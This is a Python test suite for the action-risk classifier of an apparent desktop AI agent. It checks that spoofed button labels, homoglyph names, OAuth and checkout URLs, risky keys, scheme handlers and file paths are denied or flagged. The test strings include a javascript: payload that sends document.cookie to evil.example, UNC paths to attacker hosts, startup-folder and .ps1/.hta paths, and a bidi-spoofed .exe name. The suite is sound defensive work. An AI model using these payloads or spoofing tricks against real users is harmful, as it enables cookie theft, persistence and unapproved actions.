"""Attacks on actions.classify, surfaces and the live backend guard."""
import os
import unittest
from unittest import mock

from xenon.actions import (
    Action,
    ActionContext,
    ApprovalPolicy,
    Risk,
    TaskRunner,
    classify,
    needs_card,
)
from xenon.surfaces import file_dialog_refusal, key_refused
from xenon.untrusted import mixed_script, skeleton
from xenon.windows_actions import WindowsActionBackend

_CLEAN_ENV = {key: value for key, value in os.environ.items() if key != "XENON_OUTWARD"}


class AdversarialCase(unittest.TestCase):
    def setUp(self) -> None:
        patcher = mock.patch.dict(os.environ, _CLEAN_ENV, clear=True)
        patcher.start()
        self.addCleanup(patcher.stop)


def browser(url: str = "https://shop.example.com/cart", **fields) -> ActionContext:
    base = dict(process_image="chrome.exe", url=url, window_title="Cart - Chrome")
    base.update(fields)
    return ActionContext(**base)


class PageAuthorTests(AdversarialCase):
    """A web page author controls accessible names, roles and titles."""

    def test_classify_aria_spoofed_cancel_in_browser_is_outward(self) -> None:
        # <button type=submit aria-label="Cancel"> on a purchase form.
        for role in ("button", "Button", "", "tab", "listitem", "edit"):
            with self.subTest(role=role):
                ctx = browser(element_name="Cancel", element_role=role, user_words="click cancel")
                risk, reason = classify(Action("click", target="Cancel"), ctx)
                self.assertIs(risk, Risk.OUTWARD, reason)

    def test_spoofed_cancel_is_outward_through_legacy_click_control(self) -> None:
        risk, _ = classify(Action("click_control", target="Cancel", value="Button"), browser())

        self.assertIs(risk, Risk.OUTWARD)

    def test_user_words_never_downgrade_a_page_element(self) -> None:
        ctx = browser(element_name="Next", element_role="tabitem", user_words="click next")

        self.assertIs(classify(Action("click"), ctx)[0], Risk.OUTWARD)

    def test_page_title_cannot_claim_to_be_a_safe_app(self) -> None:
        ctx = browser(window_title="notes.txt - Notepad", element_name="OK", element_role="button")

        self.assertIs(classify(Action("click"), ctx)[0], Risk.OUTWARD)

    def test_consent_and_checkout_urls_denied(self) -> None:
        for url in (
            "https://accounts.google.com/o/oauth2/v2/auth?client_id=x&redirect_uri=y",
            "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=x",
            "https://login.live.com/oauth20_authorize.srf?client_id=x&response_type=code",
            "https://github.com/login/oauth/authorize?client_id=abc",
            "https://evil.example/oauth/authorize?client_id=a&redirect_uri=b",
            "https://evil.example/OAuth2/%61uthorize",  # percent-encoded
            "https://evil.example/oauth2/%2561uthorize",  # double-encoded
            "https://app.example.com/connect?client_id=a&response_type=token",
            "https://microsoft.com/devicelogin",
            "https://github.com/login/device",
            "https://pay.google.com/gp/p/ui/pay",
            "https://www.paypal.com/checkoutnow?token=EC-1",
            "https://checkout.stripe.com/c/pay/cs_live_x",
            "https://api.razorpay.com/v1/checkout/embedded",
            "https://www.amazon.in/checkout/p/p-123",
            "https://accounts.g\u043e\u043egle.com/signin",  # Cyrillic o's
            "https://accounts.google.com.evil.example/",
            "upi://pay?pa=attacker@upi&am=5000",
            "chrome://settings/passwords",
            "edge://extensions/",
            "opera://settings/privacy",
            "about:config",
            "chrome-extension://abcdef/options.html",
            "https://chromewebstore.google.com/detail/x",
        ):
            with self.subTest(url=url):
                ctx = browser(url=url, element_name="Allow", element_role="button")
                risk, reason = classify(Action("click"), ctx)
                self.assertIs(risk, Risk.DENIED, reason)
                self.assertIs(classify(Action("type_text", value="hi"), ctx)[0], Risk.DENIED)

    def test_typing_script_urls_into_the_omnibox_is_denied(self) -> None:
        ctx = browser(element_name="Address and search bar", element_role="edit")
        for text in ("javascript:fetch('//evil.example?'+document.cookie)", "JaVa\tScRiPt:alert(1)",
                     "data:text/html;base64,PHNjcmlwdD4=", "chrome://flags"):
            with self.subTest(text=text):
                self.assertIs(classify(Action("type_text", value=text), ctx)[0], Risk.DENIED)

    def test_unreadable_url_is_treated_as_comms(self) -> None:
        ctx = ActionContext(process_image="opera.exe", url="", focused_role="Edit")

        self.assertIs(classify(Action("press_keys", value="enter"), ctx)[0], Risk.OUTWARD)
        self.assertIs(classify(Action("type_text", value="a\n"), ctx)[0], Risk.OUTWARD)


class RemoteSenderTests(AdversarialCase):
    """Senders control message text, group names and link previews."""

    def test_unknown_element_name_in_comms_is_outward(self) -> None:
        for image in ("WhatsApp.Root.exe", "Discord.exe", "slack.exe", "claude.exe", "olk.exe"):
            for name in ("", "   ", "\u200b\u200c", "unknown"):
                with self.subTest(image=image, name=ascii(name)):
                    ctx = ActionContext(process_image=image, element_name=name, element_role="ListItem")
                    self.assertIs(classify(Action("click"), ctx)[0], Risk.OUTWARD)

    def test_links_in_messages_are_outward_even_when_named_in_his_words(self) -> None:
        ctx = ActionContext(
            process_image="WhatsApp.Root.exe",
            element_name="photos",
            element_role="Hyperlink",
            user_words="open the photos",
        )

        self.assertIs(classify(Action("click"), ctx)[0], Risk.OUTWARD)

    def test_obfuscated_send_is_still_matched(self) -> None:
        for name in (
            "S\u200bend",  # zero-width space
            "\u0405end",  # Cyrillic capital Dze
            "S\u0435nd",  # Cyrillic ie
            "\uff33\uff45\uff4e\uff44",  # full-width
            "SEND\u2060NOW",  # word joiner
            "\u202edneS",  # right-to-left override shows "Send"
            "btnSend",  # camelCase automation name
            "S\u00e9nd",  # accent
            "\u03a1ost",  # Greek capital Rho
            "Submit\u00ad",  # soft hyphen
        ):
            with self.subTest(name=ascii(name)):
                ctx = ActionContext(process_image="someapp.exe", element_name=name, element_role="Button")
                risk, reason = classify(Action("click"), ctx)
                self.assertIs(risk, Risk.OUTWARD, reason)

    def test_obfuscated_delete_is_destructive(self) -> None:
        for name in ("D\u200belete", "\u0500elete", "D\u0435lete", "R\u0435move", "Don\u2019t Save"):
            with self.subTest(name=ascii(name)):
                ctx = ActionContext(process_image="someapp.exe", element_name=name, element_role="Button")
                self.assertIs(classify(Action("click"), ctx)[0], Risk.DESTRUCTIVE)

    def test_greek_alpha_chat_title_is_flagged_as_confusable(self) -> None:
        fake, real = "\u0391mma", "Amma"

        self.assertEqual(skeleton(fake), skeleton(real))
        self.assertNotEqual(fake, real)
        self.assertTrue(mixed_script(fake))  # Greek Alpha + Latin "mma"
        self.assertFalse(mixed_script(real))

    def test_drafter_url_in_typed_text_needs_a_card(self) -> None:
        ctx = ActionContext(
            process_image="notepad.exe",
            focused_role="Document",
            tainted=True,
            user_words="write a reply saying thanks",
            allowlist=frozenset({"notepad.exe"}),
        )

        risk, reason = classify(Action("type_text", value="Thanks! Details: bit.ly/x9z"), ctx)

        self.assertIs(risk, Risk.LOCAL)
        self.assertTrue(needs_card(risk, reason))


class KeyAndFileTests(AdversarialCase):
    def test_key_blocklist_and_tainted_browser_keys(self) -> None:
        for keys in (
            "alt+f4", "Alt + F4", "F4+ALT", "\uff41\uff4c\uff54\uff0b\uff46\uff14",  # full-width
            "al\u200bt+f4", "\u0430lt+f4",  # zero-width, Cyrillic a
            "win", "Windows", "LWin+R", "win+x", "win+l", "win+s", "win+e", "win+q", "win+3",
            "ctrl+esc", "control+shift+escape", "ctrl+alt+del", "F12",
            "ctrl+shift+i", "ctrl+shift+j", "ctrl+shift+c", "ctrl+a, alt+f4",
        ):
            with self.subTest(keys=ascii(keys)):
                self.assertIsNotNone(key_refused(keys))
                self.assertIs(classify(Action("press_keys", value=keys), ActionContext(process_image="notepad.exe"))[0], Risk.DENIED)

        tainted = ActionContext(process_image="msedge.exe", url="https://news.example", tainted=True)
        clean = ActionContext(process_image="msedge.exe", url="https://news.example")
        unknown_tainted = ActionContext(tainted=True)
        for keys in ("ctrl+l", "Alt+D", "f6", "CTRL+T"):
            with self.subTest(keys=keys):
                self.assertIs(classify(Action("press_keys", value=keys), tainted)[0], Risk.DENIED)
                self.assertIs(classify(Action("press_keys", value=keys), unknown_tainted)[0], Risk.DENIED)
                # Untainted they are not denied, but still outward in a browser.
                self.assertIs(classify(Action("press_keys", value=keys), clean)[0], Risk.OUTWARD)

    def test_file_dialog_refuses_startup_unc_and_script_ext(self) -> None:
        startup = r"C:\Users\rosha\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.txt"
        cases = (
            startup,
            startup.upper(),
            startup.replace("\\", "/"),
            r"C:\Users\rosha\AppData\Roaming\Microsoft\Windows\STARTM~1\Programs\Startup\u.txt",
            r"\\attacker.example\share\notes.txt",
            r"\\?\UNC\attacker\share\a.txt",
            "//attacker/share/a.txt",
            "shell:startup",
            r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\a.txt",
            "notes.txt:payload.ps1",
            "notes.ps1",
            "notes.PS1",
            "notes.ps\uff11",  # full-width 1
            "notes.ps1.",
            "notes.ps1 ",
            "report.pdf.lnk",
            "open.url",
            "setup.msi",
            "fix.reg",
            "run.hta",
            "invoice\u202efdp.exe",  # bidi-spoofed name
        )
        for path in cases:
            with self.subTest(path=ascii(path)):
                words = f"save it as {path}"
                self.assertIsNotNone(file_dialog_refusal(path, words))
                ctx = ActionContext(process_image="notepad.exe", element_name="File name:", element_role="Edit", user_words=words)
                self.assertIs(classify(Action("set_text", value=path), ctx)[0], Risk.DENIED)

    def test_file_dialog_name_must_come_from_his_words(self) -> None:
        ctx = ActionContext(
            process_image="notepad.exe",
            element_name="File name:",
            element_role="Edit",
            user_words="save it as todo.txt",
        )

        self.assertIs(classify(Action("set_text", value="todo.txt"), ctx)[0], Risk.LOCAL)
        self.assertIs(classify(Action("set_text", value="t0do.txt"), ctx)[0], Risk.DENIED)


class ModelAndCliTests(AdversarialCase):
    """Model error, and `xenon do --yes` approving everything."""

    def test_open_app_given_uri_unc_and_scheme_handler_is_denied(self) -> None:
        for origin in ("model", "voice", "typed"):
            for target in (r"\\attacker\share\run.exe", "ms-msdt:/id PCWDiagnostic", "search-ms:query=x",
                           "whatsapp://send?phone=1&text=x", "file:///C:/Windows/System32/cmd.exe"):
                with self.subTest(origin=origin, target=target):
                    ctx = ActionContext(origin=origin)
                    self.assertIs(classify(Action("open_app", target=target), ctx)[0], Risk.DENIED)

    def test_model_cannot_lower_risk(self) -> None:
        ctx = ActionContext(process_image="WhatsApp.Root.exe", focused_role="Edit")
        for hint in (Risk.READ, Risk.LOCAL, "read", "local", "safe"):
            with self.subTest(hint=hint):
                self.assertIs(classify(Action("press_keys", value="enter"), ctx, model_hint=hint)[0], Risk.OUTWARD)

    def test_yes_flag_cannot_send_through_the_legacy_backend(self) -> None:
        """`xenon do --yes "tell mom hi"`: every step approved, nothing sent."""

        class FakeUser32:
            def __init__(self) -> None:
                self.events = []

            def keybd_event(self, key, scan, flags, extra) -> None:
                self.events.append(key)

        class Foreground:
            def foreground_handle(self) -> int:
                return 1

            def title(self, handle: int) -> str:
                return "WhatsApp"

        backend = WindowsActionBackend(
            backend=Foreground(),
            desktop_factory=lambda: None,
            context_reader=lambda action: ActionContext(
                process_image="WhatsApp.Root.exe", window_title="WhatsApp", focused_role="Edit"
            ),
        )
        user32 = FakeUser32()
        backend._user32 = user32
        typed: list[str] = []
        backend._send_unicode = typed.append

        outcome = TaskRunner(ApprovalPolicy(), backend, approver=lambda action: True).run(
            "tell mom hi",
            [Action("type_text", value="hi"), Action("press_keys", value="enter")],
        )

        self.assertEqual(outcome.status, "failed")
        self.assertEqual(typed, ["hi"])  # typing into a composer is local
        self.assertEqual(user32.events, [])  # but Enter never went out
        self.assertIn("orb", outcome.detail)

    def test_newline_smuggled_into_typed_text_cannot_send(self) -> None:
        backend = WindowsActionBackend(
            backend=_NoWin32(),
            desktop_factory=lambda: None,
            context_reader=lambda action: ActionContext(process_image="Discord.exe", focused_role="Edit"),
        )
        typed: list[str] = []
        backend._send_unicode = typed.append

        for text in ("hi\n", "hi\r", "hi\r\nthere", "hi\u2028", "hi\u2029", "hi\x85"):
            with self.subTest(text=ascii(text)):
                result = backend.execute(Action("type_text", value=text))
                self.assertFalse(result.ok)
        self.assertEqual(typed, [])


class _NoWin32:
    def foreground_handle(self) -> int:
        return 1

    def title(self, handle: int) -> str:
        return "Discord"


if __name__ == "__main__":
    unittest.main()
